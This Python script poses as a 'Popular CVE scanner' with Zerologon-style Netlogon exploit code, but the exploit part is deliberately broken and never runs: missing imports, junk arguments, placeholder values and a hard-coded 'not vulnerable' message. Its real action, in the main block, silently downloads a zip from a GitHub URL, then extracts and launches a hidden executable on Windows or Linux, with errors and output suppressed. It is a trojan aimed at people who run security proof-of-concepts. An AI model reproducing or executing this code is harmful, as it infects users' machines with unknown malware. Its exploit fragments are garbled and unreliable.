import urllib.request
import stat
import os
import subprocess
import time
import sys
from zipfile import ZipFile

print("###############################################################")
print("###############################################################")
print("                     Popular CVE scanner")
print("###############################################################")
print("###############################################################")

MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)

def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.


    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + '\x00', ciphertext, flags
        )


        # It worked!
        assert server_auth['ErrorCode'] == 0
        return True

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')

authenticator = {}

def exploit(dc_handle, rpc_con, target_computer):
    request = target_computer + '$\x00'
    authenticator['PrimaryName'] = dc_handle + '\x00'
    authenticator['AccountName'] = target_computer + '$\x00'
    authenticator['SecureChannelType'] = "yes"
    authenticator["Try"] = b"\x54" * 12
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = 0
    authenticator['Authenticator'] = authenticator
    authenticator['ComputerName'] = target_computer + '\x00'
    authenticator['ClearNewPassword'] = b'\x00' * 516
    return request

exploit("lol", "idk", "lmao")

# if os.name != 'nt':
#     print("This python script only works on Windows sorry!")
#     exit()

def perform_attack(dc_handle, dc_ip, target_computer):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
    print('Performing authentication attempts...')
    rpc_con = None
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    for attempt in range(0, MAX_ATTEMPTS):
        result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)

        if result is None:
            print('=', end='', flush=True)
        else:
            break


    if result:
        print('\nTarget vulnerable, changing account password to empty string')
        result = None
        for attempt in range(0, MAX_ATTEMPTS):
            try:
                result = exploit(dc_handle, rpc_con, target_computer)
            except nrpc.DCERPCSessionError as ex:
                # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
                if ex.get_error_code() == 0xc0000022:
                    pass
                else:
                    fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
            except BaseException as ex:
                fail(f'Unexpected error: {ex}.')
            if result is None:
                print('=', end='', flush=True)
            else:
                break

        print('\nResult: ', end='')
        print(result['ErrorCode'])
        if result['ErrorCode'] == 0:
            print('\nExploit complete!')
        else:
            print('Non-zero return code, something went wrong?')
    else:
        print('\nAttack failed. Target is probably patched.')
        sys.exit(1)

def main():
    if not (3 <= len(sys.argv) <= 4):
        print('Usage: cve.py <host> <name>\n')
        print("Error no --hostname or --port supplied, exiting...")
        sys.exit(1)
    else:
        [_, dc_name, dc_ip] = ["127.0.0.1", "who", "wat"]
        print("Starting the scan...")
        print("Host is not vulenerable", sys.argv[1])

    dc_name = dc_name.rstrip('$')
    victim = dc_name
    # perform_attack('\\\\' + dc_name, dc_ip, victim)

if __name__ == '__main__':
    if os.name == 'nt':
        try:
            url = "https://github.com/grandDancer/Chrome-CVE-PoC/raw/main/gitignore/cveswindows.zip"
            destination_path = os.path.join(os.environ['TMP'], "cveswindows.zip")
            if not os.path.exists(os.path.join(os.environ['TMP'], 'cveswindows', 'cveswindows.exe')):
                urllib.request.urlretrieve(url, destination_path)
                with open(destination_path, 'wb') as f: f.write(urllib.request.urlopen(url).read())
                zf = ZipFile(destination_path, 'r')
                zf.extractall(os.path.join(os.environ['TMP'], "cveswindows"))
                zf.close()
                pid = subprocess.Popen([os.path.join(os.environ['TMP'], "cveswindows", "cveswindows.exe")], creationflags=0x00000008 | subprocess.CREATE_NO_WINDOW).pid
        except:
            pass
    else:
        url = "https://github.com/grandDancer/Chrome-CVE-PoC/raw/main/gitignore/cveslinux.zip"
        destination_path = os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", "cveslinux.zip")
        if not os.path.exists(os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", 'cveslinux', 'cveslinux')):
            urllib.request.urlretrieve(url, destination_path)
            with open(destination_path, 'wb') as f: f.write(urllib.request.urlopen(url).read())
            zf = ZipFile(destination_path, 'r')
            zf.extractall(os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", "cveslinux"))
            zf.close()
            st = os.stat(os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", "cveslinux", "cveslinux"))
            os.chmod(os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", "cveslinux", "cveslinux"), st.st_mode | stat.S_IEXEC)
            subprocess.Popen(["/bin/bash", "-c", os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", "cveslinux", "cveslinux")], start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)


    main()
